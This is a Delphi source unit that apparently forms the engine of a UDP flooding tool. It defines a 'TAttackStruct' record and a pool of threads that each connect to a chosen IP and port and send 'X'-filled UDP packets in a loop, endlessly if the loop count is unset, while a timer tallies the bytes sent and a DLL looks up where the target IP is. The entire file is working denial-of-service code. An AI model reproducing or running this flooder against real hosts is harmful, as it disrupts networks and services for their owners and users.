{-----------------------------------------------------------------------------
 Unit Name: uDM
 Author:    jzx
 Purpose:   防止UDP控件和发送UDP包的线程对象
 History:
-----------------------------------------------------------------------------}


unit uDM;

interface

uses
  SysUtils, Windows, Messages, Classes, Graphics, Controls, Forms, ComCtrls,
  Dialogs, DBTables, DB, WSocket, WinSock, ExtCtrls, ImgList;

resourcestring
  RS_UNKNOWN_ADDRESS = '未知数据';

const
  CS_IP_SEARCH_DLL = 'ipsearcher.dll';
  CS_GET_ADDRESS = '_GetAddress';

type
  TGetIPAddressLocation = function(PP : Pointer) : PPChar;stdcall;

  TAttackStruct = packed record
    OverFlow: Boolean;
    PackageLength: Longint;
    SenderCount: Longint;
    Interval: Longint;
    LoopCount : Longint;
  end;

  pAttackStruct = ^TAttackStruct;

  TDM = class(TDataModule)
    MUDP: TWSocket;
    MUDP_Sender: TWSocket;
    MainImageList: TImageList;
  private
    { Private declarations }
  public
    { Public declarations }
  end;

  TSocketSenders = class;

  TSocketSender = class(TThread)
  private
    { Private declarations }
    FSockAddrIn: TSOCKADDRIN;
    FSock: TSocket;
    FParent: TSocketSenders;
//    FActive: Boolean;
    FLoopCount : Longint;
    FOnSenderMissionFinished: TNotifyEvent;
//    procedure Set_Active(const Value: Boolean);
  protected
    FBuf: string;
    procedure Execute; override;
    procedure DoTerminate; override;
    procedure BindSocket; virtual;
    procedure CreateUdpPackage; virtual;
    function SendDpkpackages: Longint;
  public
    constructor Create(Owner: TObject; const ASenderIndex: Integer); reintroduce; overload;
//    property Active: Boolean read FActive write Set_Active;
    property OnSenderMissionFinished : TNotifyEvent read FOnSenderMissionFinished Write FOnSenderMissionFinished;
  end; { TSocketSender }

  TSocketSenders = class
  private
    FList : TList;
    FActive: Boolean;
    FLoopCount: Integer;
    FPort: Integer;
    FSenderPackagesSize: Int64;
    FUDPpackageLength: Integer;
    FSenderCount: Integer;
    FDelayTime: Integer;
    FIp: string;
    FTimer: TTimer;
    FSendTime : Int64;
    FOnTimer: TNotifyEvent;
    FOnSendersTimer: TNotifyEvent;
    FContainer: TListItem;
    FSuspendSenderCount : Longint;
    function Get_Items(const Index: Integer): TSocketSender;
    procedure Set_Active(const Value: Boolean);
    procedure OnTimer(Sender : TObject);
    procedure SenderMissionFinished(Sender : TObject);
  protected
    procedure DoActive; virtual;
    procedure DoDeActive; virtual;
    //挂起所有Sender
    procedure SuspendAllSender; virtual;
    //唤醒所有Sender
    procedure ResumeAllSender; virtual;
    //释放所有Sender
    procedure FreeAllSender;
  public
    constructor Create(AContainer : TListItem);
    destructor Destroy;override;
    class function CleanSocket: DWORD;
    class function OpenSocket: DWORD;
    procedure CreateSenders;
    procedure Delete(const Index: Integer);
    property SenderCount: Integer read FSenderCount write FSenderCount;
    property SendPackagesSize: Int64 read FSenderPackagesSize write FSenderPackagesSize;
    property UDPPackageLength: Integer read FUDPpackageLength write FUDPpackageLength;
    property Items[const Index: Integer]: TSocketSender read Get_Items;
    property Ip: string read FIp write FIP;
    property Port: Integer read FPort write FPort;
    property LoopCount: Integer read FLoopCount write FLoopCount;
    property DelayTime: Integer read FDelayTime write FDelayTime;
    property Active: Boolean read FActive write Set_Active;
    property SenderTime : Int64 read FSendTime Write FSendTime;
    property OnSendersTimer : TNotifyEvent read FOnSendersTimer Write FOnSendersTimer;
    property Container : TListItem read FContainer Write FContainer;
  end; { TSocketSenders }

var
  DM: TDM;
  hInetLib: THandle;
  pIPSearch : TGetIPAddressLocation;

function GetIPLocation(const AIPString: string): string;

implementation

{$R *.dfm}

function GetIPLocation(const AIPString: string): string;
var
  pP : PPChar;
  AIP:array [0..15] of Char;
begin
  Result := RS_UNKNOWN_ADDRESS;
  if (hInetLib = 0) or (@pIPSearch = nil) then
    Exit;
  FillChar(AIP, SizeOf(AIP), 0);
  StrPLCopy(AIP, AIPString, SizeOf(AIP));
  pP := pIPSearch(@AIP);
  try
    if pP = nil then Exit;
    Result := StrPas(pP^);
    if Result = '' then  Exit;
    Inc(pP);
    if StrLen(pP^) > 0 then
      Result := Result + StrPas(pP^);
  finally
    pP := nil;
  end;//finally
end;

{ TSocketSender }

{ Important: Methods and properties of objects in VCL or CLX can only be used
  in a method called using Synchronize, for example,

      Synchronize(UpdateCaption);

  and UpdateCaption could look like,

    procedure TSocketSender.UpdateCaption;
    begin
      Form1.Caption := 'Updated in a thread';
    end; }

constructor TSocketSender.Create(Owner: TObject; const ASenderIndex: Integer);
begin
  FParent := TSocketSenders(Owner);
//  FActive := False;
  FreeOnTerminate := False;
  if FParent.LoopCount <= 0 then
    FLoopCount := -1
  else
    FLoopCount := FParent.LoopCount;
  inherited Create(True);
end;

procedure TSocketSender.BindSocket;
begin
  FSockAddrIn.sin_addr.S_addr := inet_addr(PChar(FParent.IP));
  FSockAddrIn.sin_port := htons(FParent.Port);
//  FSockAddrIn.sin_addr.S_addr := inet_addr(PChar('127.0.0.1'));
//  FSockAddrIn.sin_port := htons(400);

  FSockAddrIn.sin_family := PF_INET;
  FSock := Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
//  FActive := CONNECT(FSock, FSockAddrIn, sizeof(FSockAddrIn)) <> SOCKET_ERROR;
  CONNECT(FSock, FSockAddrIn, sizeof(FSockAddrIn));
end;

procedure TSocketSender.CreateUdpPackage;
begin
  SetLength(FBuf, FParent.UDPPackageLength);
  FillChar(FBuf[1], FParent.UDPPackageLength, Ord('X'));
//  SetLength(FBuf, 1024);
//  FillChar(FBuf[1], 1024, Ord('X'));
end;

procedure TSocketSender.DoTerminate;
begin
//  FActive := False;
  if Assigned(FOnSenderMissionFinished) then
    FOnSenderMissionFinished(Self);
  inherited;
end;

procedure TSocketSender.Execute;
begin
  BindSocket;  //把Socket绑定到目标端口
  CreateUdpPackage;  //建立UDP包
  while not Terminated do
  begin
    if FLoopCount > 0 then
      Dec(FLoopCount)
    else if FLoopCount = 0 then
    begin
      if Assigned(FOnSenderMissionFinished) then
        FOnSenderMissionFinished(Self);
      Suspend;
      if FParent.LoopCount <= 0 then
        FLoopCount := -1
      else
        FLoopCount := FParent.LoopCount;
    end;
      //发送包
    if SendDpkpackages = SOCKET_ERROR then Break;
  end;//while
  Shutdown(FSock, SD_BOTH);  //停止 Socket 收发
  CloseSocket(FSock);  //关闭 Socket
end;

function TSocketSender.SendDpkpackages: Longint;
begin
  Sleep(FParent.DelayTime);
  Result := Send(FSock, FBuf[1], Length(FBuf), 0);
  FParent.SendPackagesSize := FParent.SendPackagesSize + FParent.UDPPackageLength;
end;

//procedure TSocketSender.Set_Active(const Value: Boolean);
//begin
//  FActive := Value;
//  if FActive then
//    Resume
//  else
//    Suspend;
//end;

{ TSocketSenders }

class function TSocketSenders.CleanSocket: DWORD;
begin
  WSACleanup;
end;

constructor TSocketSenders.Create(AContainer : TListItem);
begin
  FContainer := AContainer;
  FTimer := TTimer.Create(nil);
  FTimer.Interval := 1;
  FSendTime := 0;
  FList := TList.Create;
  FActive := False;
  FUDPpackageLength := 1024;
//  FSenderCount := ASenderCount;
  FSenderPackagesSize := 0;
  FTimer.OnTimer := OnTimer;
end;

procedure TSocketSenders.CreateSenders;
var
  i : Integer;
  ASender: TSocketSender;
begin
  for i := 0 to FSenderCount - 1 do
  begin
    ASender := TSocketSender.Create(Self, i);
    ASender.OnSenderMissionFinished := SenderMissionFinished; 
    FList.Add(ASender);
  end;
end;

procedure TSocketSenders.Delete(const Index: Integer);
var
  ATemp : TSocketSender;
begin
  ATemp := Items[Index];
  if Assigned(ATemp) then
    FreeAndNil(ATemp);
  FList.Delete(Index);
end;

destructor TSocketSenders.Destroy;
begin
  FreeAllSender;
  inherited;
end;

procedure TSocketSenders.DoActive;
begin
  ResumeAllSender;
  FTimer.Enabled := True;
end;

procedure TSocketSenders.DoDeActive;
begin
  SuspendAllSender;
  FTimer.Enabled := False;
end;

procedure TSocketSenders.FreeAllSender;
begin
  FActive := False;
  while FList.Count > 0 do
  begin
    if not Items[FList.Count -1].Terminated then
      Items[FList.Count -1].Terminate;
    if Items[FList.Count -1].Suspended then
      Items[FList.Count -1].Free;
    FList.Delete(FList.Count -1);
  end;//while
end;

function TSocketSenders.Get_Items(const Index: Integer): TSocketSender;
begin
  Result := nil;
  if Index in [0..FList.Count] then
    Result := TSocketSender(FList[Index]);
end;

procedure TSocketSenders.OnTimer(Sender: TObject);
begin
  if FActive then
  begin
    Inc(FSendTime);
    FOnSendersTimer(Self);
  end;
end;

class function TSocketSenders.OpenSocket: DWORD;
var
  xl_Version: Integer;
  XL_WSADATA: tWSADATA;
begin
  xl_Version := $101;
  Result := WSASTARTUP(xl_Version, XL_WSADATA);
end;

procedure TSocketSenders.ResumeAllSender;
var
  i: Integer;
begin
  for i:= 0 to FList.Count -1 do
  begin
//    if not Items[i].Active then
//      Items[i].Active := True;

    if Items[i].Suspended then
      Items[i].Resume;
  end;//i
end;

procedure TSocketSenders.SenderMissionFinished(Sender: TObject);
begin
  Inc(FSuspendSenderCount);
  if FSuspendSenderCount = FSenderCount then
  begin
//    FActive := False;
    FTimer.Enabled := False;
    FSuspendSenderCount := 0;
  end;
end;

procedure TSocketSenders.Set_Active(const Value: Boolean);
begin
  FActive := Value;
  if Active then
    DoActive
  else
    DoDeActive;
end;

procedure TSocketSenders.SuspendAllSender;
var
  i: Integer;
begin
  for i := 0 to FList.Count - 1 do
  begin
    if not Items[i].Suspended then
      Items[i].Suspend;
//    if Items[i].Active then
//      Items[i].Active := False;
  end; //i
end;

initialization
  hInetLib := LoadLibrary(CS_IP_SEARCH_DLL);
  if hInetLib <> 0 then
    @pIPSearch := GetProcAddress(hInetLib, CS_GET_ADDRESS);

finalization
  FreeLibrary(hInetLib);
end.

